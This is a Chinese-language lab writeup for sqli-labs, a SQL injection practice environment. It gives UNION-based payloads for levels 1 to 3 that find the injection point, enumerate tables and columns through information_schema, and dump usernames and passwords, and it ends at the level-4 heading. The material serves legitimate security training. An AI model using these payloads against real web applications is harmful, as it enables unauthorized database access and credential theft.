---
typora-copy-images-to: ../images
typora-root-url: ..
---



# sqli-labs writeup

刷刷sqli-labs ，学习下sql注入漏洞

环境是win10虚拟机, phpstudy搭建的

php版本:5.4.45

mysql版本:5.7.26



### less-1

单引号闭合

payload:

```
获取表名
?id=0' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+
获取列名
?id=0' union select 1,2,group_concat(column_name) from  information_schema.columns where table_name='users' --+
获取字段内容
?id=0' union select 1,2,group_concat(0x3a,username,0x3a,password) from users --+
```



### less-2

数字型注入,直接用union注入就可以了

payload:

```
获取表名
?id=0 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()
获取列名
?id=0 union select 1,2,group_concat(column_name) from  information_schema.columns where table_name='users'
获取字段内容
?id=0 union select 1,2,group_concat(0x3a,username,0x3a,password) from users 
```



### less-3

单引号加圆括号闭合

payload：

```
注入点探测：
?id=1') and 1=2 --+
获取列数量：
?id=1') order by 4 --+
获取表名：
?id=0') union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+
获取列名：
?id=0') union select 1,2,group_concat(column_name) from  information_schema.columns where table_name='users' --+
获取数据：
?id=0') union select 1,2,group_concat(0x3a,username,0x3a,password) from users --+
```



### less-4

